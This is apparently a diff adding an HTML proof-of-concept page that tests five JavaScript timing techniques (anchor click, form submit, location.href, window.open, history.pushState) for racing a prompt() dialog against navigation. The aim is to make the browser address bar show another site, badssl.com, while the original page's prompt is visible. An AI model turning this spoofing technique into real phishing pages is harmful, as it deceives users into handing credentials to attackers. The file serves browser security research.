@@ -1,0 +1,81 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<title>Omnibox spoofing - Prompt Race Test</title>
+	<script>
+		// Technique 1: Navigate via anchor click, prompt via beforeunload
+		// The browser starts navigation (address bar updates) then beforeunload fires
+		function technique1() {
+			var a = document.createElement('a');
+			a.href = 'https://mixed.badssl.com';
+			document.body.appendChild(a);
+
+			window.onbeforeunload = function() {
+				prompt("Test: check address bar - does it show badssl.com?");
+			};
+
+			a.click();
+		}
+
+		// Technique 2: Use form submission to navigate, prompt in beforeunload
+		function technique2() {
+			window.onbeforeunload = function() {
+				prompt("Test: check address bar - does it show badssl.com?");
+			};
+
+			var form = document.createElement('form');
+			form.method = 'GET';
+			form.action = 'https://mixed.badssl.com';
+			document.body.appendChild(form);
+			form.submit();
+		}
+
+		// Technique 3: Navigate first, then rapid prompt via micro-task timing
+		function technique3() {
+			window.location.href = 'https://mixed.badssl.com';
+
+			// Queue prompt after navigation starts using different async mechanisms
+			// Try multiple timing strategies
+			Promise.resolve().then(function() {
+				prompt("Test (microtask): check address bar now");
+			});
+		}
+
+		// Technique 4: window.open + opener prompt
+		function technique4() {
+			var w = window.open('https://mixed.badssl.com', '_self');
+			setTimeout(function() {
+				prompt("Test (setTimeout): check address bar now");
+			}, 0);
+		}
+
+		// Technique 5: History API + prompt
+		function technique5() {
+			history.pushState({}, '', 'https://mixed.badssl.com');
+			prompt("Test (pushState): check address bar now");
+		}
+	</script>
+</head>
+
+<body>
+	<center>
+		<br>
+		<h3>Address Bar + Prompt Race Condition Test</h3>
+		<p>Each button tests a different technique. Check if the address bar<br>shows the destination URL while the prompt is visible.</p>
+		<br>
+		<input type="button" value="Technique 1: Anchor + beforeunload" onclick="technique1()">
+		<br><br>
+		<input type="button" value="Technique 2: Form submit + beforeunload" onclick="technique2()">
+		<br><br>
+		<input type="button" value="Technique 3: location.href + microtask" onclick="technique3()">
+		<br><br>
+		<input type="button" value="Technique 4: window.open(_self) + setTimeout" onclick="technique4()">
+		<br><br>
+		<input type="button" value="Technique 5: history.pushState + prompt" onclick="technique5()">
+		<br><br>
+		<p><small>PoC: Tests whether address bar updates before prompt blocks the thread</small></p>
+	</center>
+</body>
+
+</html>
